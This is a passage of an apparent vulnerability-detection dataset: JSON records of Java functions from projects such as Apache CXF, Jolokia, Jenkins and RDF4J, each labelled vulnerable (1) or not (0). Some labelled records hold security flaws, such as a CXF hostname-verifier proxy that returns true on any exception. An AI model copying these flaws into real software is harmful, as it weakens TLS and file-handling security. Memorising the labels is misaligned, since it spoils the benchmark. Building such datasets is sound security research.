}\n\n    public void handlePatchConfiguration(Operation op, ServiceConfigUpdateRequest updateBody) {\n        if (updateBody == null) {\n            updateBody = op.getBody(ServiceConfigUpdateRequest.class);\n        }\n\n        if (!ServiceConfigUpdateRequest.KIND.equals(updateBody.kind)) {\n            op.fail(new IllegalArgumentException(\"Unrecognized kind: \" + updateBody.kind));\n            return;\n        }\n\n        if (updateBody.maintenanceIntervalMicros == null\n                && updateBody.operationQueueLimit == null\n                && updateBody.epoch == null\n                && (updateBody.addOptions == null || updateBody.addOptions.isEmpty())\n                && (updateBody.removeOptions == null || updateBody.removeOptions\n                        .isEmpty())) {\n            op.fail(new IllegalArgumentException(\n                    \"At least one configuraton field must be specified\"));\n            return;\n        }\n\n        // service might fail a capability toggle if the capability can not be changed after start\n        if (updateBody.addOptions != null) {\n            for (ServiceOption c : updateBody.addOptions) {\n                this.parent.toggleOption(c, true);\n            }\n        }\n\n        if (updateBody.removeOptions != null) {\n            for (ServiceOption c : updateBody.removeOptions) {\n                this.parent.toggleOption(c, false);\n            }\n        }\n\n        if (updateBody.maintenanceIntervalMicros != null) {\n            this.parent.setMaintenanceIntervalMicros(updateBody.maintenanceIntervalMicros);\n        }\n\n        op.complete();\n    }\n\n    private void initializeOrSetStat(ServiceStat stat, ServiceStat newValue) {\n        synchronized (stat) {\n            if (stat.timeSeriesStats == null && newValue.timeSeriesStats != null) {\n                stat.timeSeriesStats = new TimeSeriesStats(newValue.timeSeriesStats.numBins,\n                        newValue.timeSeriesStats.binDurationMillis, newValue.timeSeriesStats.aggregationType);\n            }\n            stat.unit = newValue.unit;\n            stat.sourceTimeMicrosUtc = newValue.sourceTimeMicrosUtc;\n            setStat(stat, newValue.latestValue);\n        }\n    }\n\n    @Override\n    public void setStat(ServiceStat stat, double newValue) {\n        allocateStats();\n        findStat(stat.name, true, stat);\n\n        synchronized (stat) {\n            stat.version++;\n            stat.accumulatedValue += newValue;\n            stat.latestValue = newValue;\n            if (stat.logHistogram != null) {\n                int binIndex = 0;\n                if (newValue > 0.0) {\n                    binIndex = (int) Math.log10(newValue);\n                }\n                if (binIndex >= 0 && binIndex < stat.logHistogram.bins.length) {\n                    stat.logHistogram.bins[binIndex]++;\n                }\n            }\n            stat.lastUpdateMicrosUtc = Utils.getNowMicrosUtc();\n            if (stat.timeSeriesStats != null) {\n                if (stat.sourceTimeMicrosUtc != null) {\n                    stat.timeSeriesStats.add(stat.sourceTimeMicrosUtc, newValue);\n                } else {\n                    stat.timeSeriesStats.add(stat.lastUpdateMicrosUtc, newValue);\n                }\n            }\n        }\n    }\n\n    @Override\n    public void adjustStat(ServiceStat stat, double delta) {\n        allocateStats();\n        synchronized (stat) {\n            stat.latestValue += delta;\n            stat.version++;\n            if (stat.logHistogram != null) {\n\n                int binIndex = 0;\n                if (delta > 0.0) {\n                    binIndex = (int) Math.log10(delta);\n                }\n                if (binIndex >= 0 && binIndex < stat.logHistogram.bins.length) {\n                    stat.logHistogram.bins[binIndex]++;\n                }\n            }\n            stat.lastUpdateMicrosUtc = Utils.getNowMicrosUtc();\n            if (stat.timeSeriesStats != null) {\n                if (stat.sourceTimeMicrosUtc != null) {\n                    stat.timeSeriesStats.add(stat.sourceTimeMicrosUtc, stat.latestValue);\n                } else {\n                    stat.timeSeriesStats.add(stat.lastUpdateMicrosUtc, stat.latestValue);\n                }\n            }\n        }\n    }\n\n    @Override\n    public ServiceStat getStat(String name) {\n        return getStat(name, true);\n    }\n\n    private ServiceStat getStat(String name, boolean create) {\n        if (!allocateStats(true)) {\n            return null;\n        }\n        return findStat(name, create, null);\n    }\n\n    private void replaceSingleStat(ServiceStat stat) {\n        if (!allocateStats(true)) {\n            return;\n        }\n        synchronized (this.stats) {\n            // create a new stat with the default values\n            ServiceStat newStat = new ServiceStat();\n            newStat.name = stat.name;\n            initializeOrSetStat(newStat, stat);\n            if (this.stats.entries == null) {\n                this.stats.entries = new HashMap<>();\n            }\n            // add it to the list of stats for this service\n            this.stats.entries.put(stat.name, newStat);\n        }\n    }\n\n    private void replaceAllStats(ServiceStats newStats) {\n        if (!allocateStats(true)) {\n            return;\n        }\n        synchronized (this.stats) {\n            // reset the current set of stats\n            this.stats.entries.clear();\n            for (ServiceStats.ServiceStat currentStat : newStats.entries.values()) {\n                replaceSingleStat(currentStat);\n            }\n\n        }\n    }\n\n    private ServiceStat findStat(String name, boolean create, ServiceStat initialStat) {\n        synchronized (this.stats) {\n            if (this.stats.entries == null) {\n                this.stats.entries = new HashMap<>();\n            }\n            ServiceStat st = this.stats.entries.get(name);\n            if (st == null && create) {\n                st = initialStat != null ? initialStat : new ServiceStat();\n                st.name = name;\n                this.stats.entries.put(name, st);\n            }\n            return st;\n        }\n    }\n\n    private void allocateStats() {\n        allocateStats(true);\n    }\n\n    private synchronized boolean allocateStats(boolean mustAllocate) {\n        if (!mustAllocate && this.stats == null) {\n            return false;\n        }\n        if (this.stats != null) {\n            return true;\n        }\n        this.stats = new ServiceStats();\n        return true;\n    }\n\n    @Override\n    public ServiceHost getHost() {\n        return this.parent.getHost();\n    }\n\n    @Override\n    public String getSelfLink() {\n        return null;\n    }\n\n    @Override\n    public URI getUri() {\n        return null;\n    }\n\n    @Override\n    public OperationProcessingChain getOperationProcessingChain() {\n        return null;\n    }\n\n    @Override\n    public ProcessingStage getProcessingStage() {\n        return ProcessingStage.AVAILABLE;\n    }\n\n    @Override\n    public EnumSet<ServiceOption> getOptions() {\n        return EnumSet.of(ServiceOption.UTILITY);\n    }\n\n    @Override\n    public boolean hasOption(ServiceOption cap) {\n        return false;\n    }\n\n    @Override\n    public void toggleOption(ServiceOption cap, boolean enable) {\n        throw new RuntimeException();\n    }\n\n    @Override\n    public void adjustStat(String name, double delta) {\n        return;\n    }\n\n    @Override\n    public void setStat(String name, double newValue) {\n        return;\n    }\n\n    @Override\n    public void handleMaintenance(Operation post) {\n        post.complete();\n    }\n\n    @Override\n    public void setHost(ServiceHost serviceHost) {\n\n    }\n\n    @Override\n    public void setSelfLink(String path) {\n\n    }\n\n    @Override\n    public void setOperationProcessingChain(OperationProcessingChain opProcessingChain) {\n\n    }\n\n    @Override\n    public ServiceRuntimeContext setProcessingStage(ProcessingStage initialized) {\n        return null;\n    }\n\n    @Override\n    public ServiceDocument setInitialState(Object state, Long initialVersion) {\n        return null;\n    }\n\n    @Override\n    public Service getUtilityService(String uriPath) {\n        return null;\n    }\n\n    @Override\n    public boolean queueRequest(Operation op) {\n        return false;\n    }\n\n    @Override\n    public void sendRequest(Operation op) {\n        throw new RuntimeException();\n    }\n\n    @Override\n    public ServiceDocument getDocumentTemplate() {\n        return null;\n    }\n\n    @Override\n    public void setPeerNodeSelectorPath(String uriPath) {\n\n    }\n\n    @Override\n    public String getPeerNodeSelectorPath() {\n        return null;\n    }\n\n    @Override\n    public void setState(Operation op, ServiceDocument newState) {\n        op.linkState(newState);\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    @Override\n    public <T extends ServiceDocument> T getState(Operation op) {\n        return (T) op.getLinkedState();\n    }\n\n    @Override\n    public void setMaintenanceIntervalMicros(long micros) {\n        throw new RuntimeException(\"not implemented\");\n    }\n\n    @Override\n    public long getMaintenanceIntervalMicros() {\n        return 0;\n    }\n\n    @Override\n    public Operation dequeueRequest() {\n        return null;\n    }\n\n    @Override\n    public Class<? extends ServiceDocument> getStateType() {\n        return null;\n    }\n\n    @Override\n    public final void setAuthorizationContext(Operation op, AuthorizationContext ctx) {\n        throw new RuntimeException(\"Service not allowed to set authorization context\");\n    }\n\n    @Override\n    public final AuthorizationContext getSystemAuthorizationContext() {\n        throw new RuntimeException(\"Service not allowed to get system authorization context\");\n    }\n}\n", "target": 1}
{"idx": 1052, "func": "package org.jolokia.http;\n\n/*\n * Copyright 2009-2011 Roland Huss\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n */\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Map;\n\nimport javax.management.*;\n\nimport org.easymock.EasyMock;\nimport org.easymock.IArgumentMatcher;\nimport org.jolokia.config.Configuration;\nimport org.jolokia.backend.BackendManager;\nimport org.jolokia.request.JmxReadRequest;\nimport org.jolokia.request.JmxRequest;\nimport org.jolokia.test.util.HttpTestUtil;\nimport org.jolokia.util.LogHandler;\nimport org.jolokia.util.RequestType;\nimport org.json.simple.JSONArray;\nimport org.json.simple.JSONObject;\nimport org.testng.annotations.*;\n\nimport static org.easymock.EasyMock.*;\nimport static org.testng.Assert.*;\n\n/**\n * @author roland\n * @since 31.08.11\n */\npublic class HttpRequestHandlerTest {\n\n    private BackendManager backend;\n    private HttpRequestHandler handler;\n\n    @BeforeMethod\n    public void setup() {\n        backend = createMock(BackendManager.class);\n        expect(backend.isDebug()).andReturn(true).anyTimes();\n\n        handler = new HttpRequestHandler(new Configuration(),backend, createDummyLogHandler());\n    }\n\n    @AfterMethod\n    public void tearDown() {\n        verify(backend);\n    }\n\n    @Test\n    public void accessAllowed() {\n        expect(backend.isRemoteAccessAllowed(\"localhost\",\"127.0.0.1\")).andReturn(true);\n        replay(backend);\n\n        handler.checkAccess(\"localhost\", \"127.0.0.1\",null);\n    }\n\n    @Test(expectedExceptions = { SecurityException.class })\n    public void accessDenied() {\n        expect(backend.isRemoteAccessAllowed(\"localhost\",\"127.0.0.1\")).andReturn(false);\n        replay(backend);\n\n        handler.checkAccess(\"localhost\", \"127.0.0.1\",null);\n    }\n\n    @Test(expectedExceptions = { SecurityException.class })\n    public void accessDeniedViaOrigin() {\n        expect(backend.isRemoteAccessAllowed(\"localhost\",\"127.0.0.1\")).andReturn(true);\n        expect(backend.isOriginAllowed(\"www.jolokia.org\",true)).andReturn(false);\n        replay(backend);\n\n        handler.checkAccess(\"localhost\", \"127.0.0.1\",\"www.jolokia.org\");\n    }\n\n\n    @Test\n    public void get() throws InstanceNotFoundException, IOException, ReflectionException, AttributeNotFoundException, MBeanException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(isA(JmxReadRequest.class))).andReturn(resp);\n        replay(backend);\n\n        JSONObject response = (JSONObject) handler.handleGetRequest(\"/jolokia\", HttpTestUtil.HEAP_MEMORY_GET_REQUEST, null);\n        assertTrue(response == resp);\n    }\n\n    @Test\n    public void getWithDoubleSlashes() throws MBeanException, AttributeNotFoundException, ReflectionException, InstanceNotFoundException, IOException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(eqReadRequest(\"read\", \"bla:type=s/lash/\", \"attribute\"))).andReturn(resp);\n        replay(backend);\n\n        JSONObject response = (JSONObject) handler.handleGetRequest(\"/read/bla%3Atype%3Ds!/lash!//attribute\",\n                                 \"/read/bla:type=s!/lash!/Ok\",null);\n        assertTrue(response == resp);\n    }\n\n    private JmxRequest eqReadRequest(String pType, final String pMBean, final String pAttribute) {\n        EasyMock.reportMatcher(new IArgumentMatcher() {\n            public boolean matches(Object argument) {\n                try {\n                    JmxReadRequest req = (JmxReadRequest) argument;\n                    return req.getType() == RequestType.READ &&\n                           new ObjectName(pMBean).equals(req.getObjectName()) &&\n                           pAttribute.equals(req.getAttributeName());\n                } catch (MalformedObjectNameException e) {\n                    return false;\n                }\n            }\n\n            public void appendTo(StringBuffer buffer) {\n                buffer.append(\"eqReadRequest(mbean = \\\"\");\n                buffer.append(pMBean);\n                buffer.append(\"\\\", attribute = \\\"\");\n                buffer.append(pAttribute);\n                buffer.append(\"\\\")\");\n\n            }\n        });\n        return null;\n    }\n\n\n    @Test\n    public void singlePost() throws IOException, InstanceNotFoundException, ReflectionException, AttributeNotFoundException, MBeanException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(isA(JmxReadRequest.class))).andReturn(resp);\n        replay(backend);\n\n        InputStream is = HttpTestUtil.createServletInputStream(HttpTestUtil.HEAP_MEMORY_POST_REQUEST);\n        JSONObject response = (JSONObject) handler.handlePostRequest(\"/jolokia\",is,\"utf-8\",null);\n        assertTrue(response == resp);\n    }\n\n\n    @Test\n    public void doublePost() throws IOException, InstanceNotFoundException, ReflectionException, AttributeNotFoundException, MBeanException {\n        JSONObject resp = new JSONObject();\n        expect(backend.handleRequest(isA(JmxReadRequest.class))).andReturn(resp).times(2);\n        replay(backend);\n\n        InputStream is = HttpTestUtil.createServletInputStream(\"[\" + HttpTestUtil.HEAP_MEMORY_POST_REQUEST + \",\" + HttpTestUtil.HEAP_MEMORY_POST_REQUEST + \"]\");\n        JSONArray response = (JSONArray) handler.handlePostRequest(\"/jolokia\", is, \"utf-8\", null);\n        assertEquals(response.size(),2);\n        assertTrue(response.get(0) == resp);\n        assertTrue(response.get(1) == resp);\n    }\n\n    @Test\n    public void preflightCheck() {\n        String origin = \"http://bla.com\";\n        String headers =\"X-Data: Test\";\n        expect(backend.isOriginAllowed(origin,false)).andReturn(true);\n        replay(backend);\n\n        Map<String,String> ret =  handler.handleCorsPreflightRequest(origin, headers);\n        assertEquals(ret.get(\"Access-Control-Allow-Origin\"),origin);\n    }\n\n    @Test\n    public void preflightCheckNegative() {\n        String origin = \"http://bla.com\";\n        String headers =\"X-Data: Test\";\n        expect(backend.isOriginAllowed(origin,false)).andReturn(false);\n        replay(backend);\n\n        Map<String,String> ret =  handler.handleCorsPreflightRequest(origin, headers);\n        assertNull(ret.get(\"Access-Control-Allow-Origin\"));\n    }\n\n    @Test(expectedExceptions = IllegalArgumentException.class)\n    public void invalidJson() throws IOException {\n        replay(backend);\n        InputStream is = HttpTestUtil.createServletInputStream(\"{ bla;\");\n        handler.handlePostRequest(\"/jolokia\",is,\"utf-8\",null);\n    }\n\n    @Test(expectedExceptions = IllegalArgumentException.class)\n    public void invalidJson2() throws IOException {\n        replay(backend);\n        InputStream is = HttpTestUtil.createServletInputStream(\"12\");\n        handler.handlePostRequest(\"/jolokia\",is,\"utf-8\",null);\n    }\n\n    @Test\n    public void requestErrorHandling() throws MalformedObjectNameException, InstanceNotFoundException, IOException, ReflectionException, AttributeNotFoundException, MBeanException {\n        Object[] exceptions = new Object[] {\n                new ReflectionException(new NullPointerException()), 404,500,\n                new InstanceNotFoundException(), 404, 500,\n                new MBeanException(new NullPointerException()), 500, 500,\n                new AttributeNotFoundException(), 404, 500,\n                new UnsupportedOperationException(), 500, 500,\n                new IOException(), 500, 500,\n                new IllegalArgumentException(), 400, 400,\n                new SecurityException(),403, 403,\n                new RuntimeMBeanException(new NullPointerException()), 500, 500\n        };\n\n        for (int i = 0; i < exceptions.length; i += 3) {\n            Exception e = (Exception) exceptions[i];\n            reset(backend);\n            expect(backend.isDebug()).andReturn(true).anyTimes();\n            backend.error(find(\"\" + exceptions[i + 1]), EasyMock.<Throwable>anyObject());\n            backend.error(find(\"\" + exceptions[i + 2]), EasyMock.<Throwable>anyObject());\n            expect(backend.handleRequest(EasyMock.<JmxRequest>anyObject())).andThrow(e);\n            replay(backend);\n            JSONObject resp = (JSONObject) handler.handleGetRequest(\"/jolokia\",\n                                                                    \"/read/java.lang:type=Memory/HeapMemoryUsage\",null);\n            assertEquals(resp.get(\"status\"),exceptions[i+1]);\n\n            resp = handler.handleThrowable(e);\n            assertEquals(resp.get(\"status\"),exceptions[i+2],e.getClass().getName());\n        }\n    }\n\n    // ======================================================================================================\n\n    private LogHandler createDummyLogHandler() {\n        return new LogHandler() {\n                public void debug(String message) {\n                }\n\n                public void info(String message) {\n                }\n\n                public void error(String message, Throwable t) {\n                }\n            };\n    }\n}\n", "target": 0}
{"idx": 1053, "func": "/**\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements. See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership. The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied. See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\n\npackage org.apache.cxf.transport.https;\n\nimport java.io.IOException;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.net.HttpURLConnection;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.security.GeneralSecurityException;\nimport java.util.logging.Handler;\nimport java.util.logging.Logger;\n\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\n\nimport org.apache.cxf.common.logging.LogUtils;\nimport org.apache.cxf.common.util.ReflectionInvokationHandler;\nimport org.apache.cxf.common.util.ReflectionUtil;\nimport org.apache.cxf.configuration.jsse.SSLUtils;\nimport org.apache.cxf.configuration.jsse.TLSClientParameters;\n\n\n/**\n * This HttpsURLConnectionFactory implements the HttpURLConnectionFactory\n * for using the given SSL Policy to configure TLS connections for \"https:\"\n * URLs.\n */\npublic class HttpsURLConnectionFactory {\n\n    /**\n     * This constant holds the URL Protocol Identifier for HTTPS\n     */\n    public static final String HTTPS_URL_PROTOCOL_ID = \"https\";\n\n    private static final Logger LOG =\n        LogUtils.getL7dLogger(HttpsURLConnectionFactory.class);\n\n    private static boolean weblogicWarned;\n\n    /**\n     * Cache the last SSLContext to avoid recreation\n     */\n    SSLSocketFactory socketFactory;\n    int lastTlsHash;\n\n    /**\n     * This constructor initialized the factory with the configured TLS\n     * Client Parameters for the HTTPConduit for which this factory is used.\n     */\n    public HttpsURLConnectionFactory() {\n    }\n\n    /**\n     * Create a HttpURLConnection, proxified if necessary.\n     *\n     *\n     * @param proxy This parameter is non-null if connection should be proxied.\n     * @param url   The target URL.\n     *\n     * @return The HttpURLConnection for the given URL.\n     * @throws IOException\n     */\n    public HttpURLConnection createConnection(TLSClientParameters tlsClientParameters,\n            Proxy proxy, URL url) throws IOException {\n\n        HttpURLConnection connection =\n            (HttpURLConnection) (proxy != null\n                                   ? url.openConnection(proxy)\n                                   : url.openConnection());\n        if (HTTPS_URL_PROTOCOL_ID.equals(url.getProtocol())) {\n\n            if (tlsClientParameters == null) {\n                tlsClientParameters = new TLSClientParameters();\n            }\n\n            try {\n                decorateWithTLS(tlsClientParameters, connection);\n            } catch (Throwable ex) {\n                if (ex instanceof IOException) {\n                    throw (IOException) ex;\n                }\n                IOException ioException = new IOException(\"Error while initializing secure socket\", ex);\n                throw ioException;\n            }\n        }\n\n        return connection;\n    }\n\n    /**\n     * This method assigns the various TLS parameters on the HttpsURLConnection\n     * from the TLS Client Parameters. Connection parameter is of supertype HttpURLConnection,\n     * which allows internal cast to potentially divergent subtype (https) implementations.\n     */\n    protected synchronized void decorateWithTLS(TLSClientParameters tlsClientParameters,\n            HttpURLConnection connection) throws GeneralSecurityException {\n\n\n        int hash = tlsClientParameters.hashCode();\n        if (hash != lastTlsHash) {\n            lastTlsHash = hash;\n            socketFactory = null;\n        }\n\n        // always reload socketFactory from HttpsURLConnection.defaultSSLSocketFactory and\n        // tlsClientParameters.sslSocketFactory to allow runtime configuration change\n        if (tlsClientParameters.isUseHttpsURLConnectionDefaultSslSocketFactory()) {\n            socketFactory = HttpsURLConnection.getDefaultSSLSocketFactory();\n\n        } else if (tlsClientParameters.getSSLSocketFactory() != null) {\n            // see if an SSLSocketFactory was set. This allows easy interop\n            // with not-yet-commons-ssl.jar, or even just people who like doing their\n            // own JSSE.\n            socketFactory = tlsClientParameters.getSSLSocketFactory();\n\n        } else if (socketFactory == null) {\n            // ssl socket factory not yet instantiated, create a new one with tlsClientParameters's Trust\n            // Managers, Key Managers, etc\n\n            SSLContext ctx =\n                org.apache.cxf.transport.https.SSLUtils.getSSLContext(tlsClientParameters);\n\n            String[] cipherSuites =\n                SSLUtils.getCiphersuitesToInclude(tlsClientParameters.getCipherSuites(),\n                                                  tlsClientParameters.getCipherSuitesFilter(),\n                                                  ctx.getSocketFactory().getDefaultCipherSuites(),\n                                                  SSLUtils.getSupportedCipherSuites(ctx),\n                                                  LOG);\n            // The SSLSocketFactoryWrapper enables certain cipher suites\n            // from the policy.\n            String protocol = tlsClientParameters.getSecureSocketProtocol() != null ? tlsClientParameters\n                .getSecureSocketProtocol() : \"TLS\";\n            socketFactory = new SSLSocketFactoryWrapper(ctx.getSocketFactory(), cipherSuites,\n                                                        protocol);\n            //recalc the hashcode since some of the above MAY have changed the tlsClientParameters\n            lastTlsHash = tlsClientParameters.hashCode();\n        } else {\n           // ssl socket factory already initialized, reuse it to benefit of keep alive\n        }\n\n\n        HostnameVerifier verifier = org.apache.cxf.transport.https.SSLUtils\n            .getHostnameVerifier(tlsClientParameters);\n\n        if (connection instanceof HttpsURLConnection) {\n            // handle the expected case (javax.net.ssl)\n            HttpsURLConnection conn = (HttpsURLConnection) connection;\n            conn.setHostnameVerifier(verifier);\n            conn.setSSLSocketFactory(socketFactory);\n        } else {\n            // handle the deprecated sun case and other possible hidden API's\n            // that are similar to the Sun cases\n            try {\n                Method method = connection.getClass().getMethod(\"getHostnameVerifier\");\n\n                InvocationHandler handler = new ReflectionInvokationHandler(verifier) {\n                    public Object invoke(Object proxy,\n                                         Method method,\n                                         Object[] args) throws Throwable {\n                        try {\n                            return super.invoke(proxy, method, args);\n                        } catch (Exception ex) {\n                            return true;\n                        }\n                    }\n                };\n                Object proxy = java.lang.reflect.Proxy.newProxyInstance(this.getClass().getClassLoader(),\n                                                                        new Class[] {method.getReturnType()},\n                                                                        handler);\n\n                method = connection.getClass().getMethod(\"setHostnameVerifier\", method.getReturnType());\n                method.invoke(connection, proxy);\n            } catch (Exception ex) {\n                //Ignore this one\n            }\n            try {\n                Method getSSLSocketFactory = connection.getClass().getMethod(\"getSSLSocketFactory\");\n                Method setSSLSocketFactory = connection.getClass()\n                    .getMethod(\"setSSLSocketFactory\", getSSLSocketFactory.getReturnType());\n                if (getSSLSocketFactory.getReturnType().isInstance(socketFactory)) {\n                    setSSLSocketFactory.invoke(connection, socketFactory);\n                } else {\n                    //need to see if we can create one - mostly the weblogic case.   The\n                    //weblogic SSLSocketFactory has a protected constructor that can take\n                    //a JSSE SSLSocketFactory so we'll try and use that\n                    Constructor<?> c = getSSLSocketFactory.getReturnType()\n                        .getDeclaredConstructor(SSLSocketFactory.class);\n                    ReflectionUtil.setAccessible(c);\n                    setSSLSocketFactory.invoke(connection, c.newInstance(socketFactory));\n                }\n            } catch (Exception ex) {\n                if (connection.getClass().getName().contains(\"weblogic\")) {\n                    if (!weblogicWarned) {\n                        weblogicWarned = true;\n                        LOG.warning(\"Could not configure SSLSocketFactory on Weblogic.  \"\n                                    + \" Use the Weblogic control panel to configure the SSL settings.\");\n                    }\n                    return;\n                }\n                //if we cannot set the SSLSocketFactory, we're in serious trouble.\n                throw new IllegalArgumentException(\"Error decorating connection class \"\n                        + connection.getClass().getName(), ex);\n            }\n        }\n    }\n\n    /*\n     *  For development and testing only\n     */\n    protected void addLogHandler(Handler handler) {\n        LOG.addHandler(handler);\n    }\n\n}\n\n\n\n", "target": 1}
{"idx": 1054, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2010, InfraDNA, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.diagnosis;\n\nimport hudson.Extension;\nimport hudson.Util;\nimport hudson.model.AdministrativeMonitor;\nimport org.kohsuke.stapler.HttpRedirect;\nimport org.kohsuke.stapler.HttpResponse;\nimport org.kohsuke.stapler.HttpResponses;\nimport org.kohsuke.stapler.QueryParameter;\n\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport jenkins.model.Jenkins;\nimport org.kohsuke.stapler.Stapler;\nimport org.kohsuke.stapler.interceptor.RequirePOST;\n\n/**\n * Looks out for a broken reverse proxy setup that doesn't rewrite the location header correctly.\n *\n * <p>\n * Have the JavaScript make an AJAX call, to which we respond with 302 redirect. If the reverse proxy\n * is done correctly, this will be handled by {@link #doFoo()}, but otherwise we'll report that as an error.\n * Unfortunately, {@code XmlHttpRequest} doesn't expose properties that allow the client-side JavaScript\n * to learn the details of the failure, so we have to make do with limited information.\n *\n * @author Kohsuke Kawaguchi\n */\n@Extension\npublic class ReverseProxySetupMonitor extends AdministrativeMonitor {\n\n    private static final Logger LOGGER = Logger.getLogger(ReverseProxySetupMonitor.class.getName());\n\n    @Override\n    public boolean isActivated() {\n        // return true to always inject an HTML fragment to perform a test\n        return true;\n    }\n\n    public HttpResponse doTest() {\n        String referer = Stapler.getCurrentRequest().getReferer();\n        Jenkins j = Jenkins.getInstance();\n        assert j != null;\n        // May need to send an absolute URL, since handling of HttpRedirect with a relative URL does not currently honor X-Forwarded-Proto/Port at all.\n        String redirect = j.getRootUrl() + \"administrativeMonitor/\" + id + \"/testForReverseProxySetup/\" + (referer != null ? Util.rawEncode(referer) : \"NO-REFERER\") + \"/\";\n        LOGGER.log(Level.FINE, \"coming from {0} and redirecting to {1}\", new Object[] {referer, redirect});\n        return new HttpRedirect(redirect);\n    }\n\n    public void getTestForReverseProxySetup(String rest) {\n        Jenkins j = Jenkins.getInstance();\n        assert j != null;\n        String inferred = j.getRootUrlFromRequest() + \"manage\";\n        // TODO this could also verify that j.getRootUrl() has been properly configured, and send a different message if not\n        if (rest.startsWith(inferred)) { // not using equals due to JENKINS-24014\n            throw HttpResponses.ok();\n        } else {\n            LOGGER.log(Level.WARNING, \"{0} vs. {1}\", new Object[] {inferred, rest});\n            throw HttpResponses.errorWithoutStack(404, inferred + \" vs. \" + rest);\n        }\n    }\n\n    /**\n     * Depending on whether the user said \"yes\" or \"no\", send him to the right place.\n     */\n    @RequirePOST\n    public HttpResponse doAct(@QueryParameter String no) throws IOException {\n        if(no!=null) { // dismiss\n            disable(true);\n            // of course the irony is that this redirect won't work\n            return HttpResponses.redirectViaContextPath(\"/manage\");\n        } else {\n            return new HttpRedirect(\"https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+says+my+reverse+proxy+setup+is+broken\");\n        }\n    }\n}\n\n", "target": 0}
{"idx": 1055, "func": "/*******************************************************************************\n * Copyright (c) 2015 Eclipse RDF4J contributors, Aduna, and others.\n * All rights reserved. This program and the accompanying materials\n * are made available under the terms of the Eclipse Distribution License v1.0\n * which accompanies this distribution, and is available at\n * http://www.eclipse.org/org/documents/edl-v10.php.\n *******************************************************************************/\n\npackage org.eclipse.rdf4j.common.io;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Arrays;\nimport java.util.Enumeration;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipFile;\n\n/**\n * Zip-related utilities.\n */\npublic class ZipUtil {\n\n\t/**\n\t * Magic number for ZIP files (4 bytes: <tt>0x04034b50</tt>).\n\t */\n\tprivate final static byte MAGIC_NUMBER[] = { (byte)0x50, (byte)0x4B, (byte)0x03, (byte)0x04 };\n\n\t/**\n\t * Test if an input stream is a zip input stream by checking the \"magic number\"\n\t * \n\t * @param in input stream\n\t * @return true if start of input stream matches magic number\n\t * @throws IOException \n\t */\n\tpublic static boolean isZipStream(InputStream in) throws IOException {\n\t\tin.mark(MAGIC_NUMBER.length);\n\t\tbyte[] fileHeader = IOUtil.readBytes(in, MAGIC_NUMBER.length);\n\t\tin.reset();\n\t\treturn Arrays.equals(MAGIC_NUMBER, fileHeader);\n\t}\n\n\t/**\n\t * Extract the contents of a zipfile to a directory.\n\t * \n\t * @param zipFile\n\t *        the zip file to extract\n\t * @param destDir\n\t *        the destination directory\n\t * @throws IOException\n\t *         when something untoward happens during the extraction process\n\t */\n\tpublic static void extract(File zipFile, File destDir) throws IOException {\n\t\ttry (ZipFile zf = new ZipFile(zipFile)) {\n\t\t\textract(zf, destDir);\n\t\t}\n\t}\n\n\t/**\n\t * Extract the contents of a zipfile to a directory.\n\t * \n\t * @param zipFile\n\t *        the zip file to extract\n\t * @param destDir\n\t *        the destination directory\n\t * @throws IOException\n\t *         when something untoward happens during the extraction process\n\t */\n\tpublic static void extract(ZipFile zipFile, File destDir) throws IOException {\n\t\tassert destDir.isDirectory();\n\n\t\tEnumeration<? extends ZipEntry> entries = zipFile.entries();\n\t\twhile (entries.hasMoreElements()) {\n\t\t\tZipEntry entry = entries.nextElement();\n\t\t\twriteEntry(zipFile, entry, destDir);\n\t\t}\n\t}\n\n\t/**\n\t * Write an entry to a zip 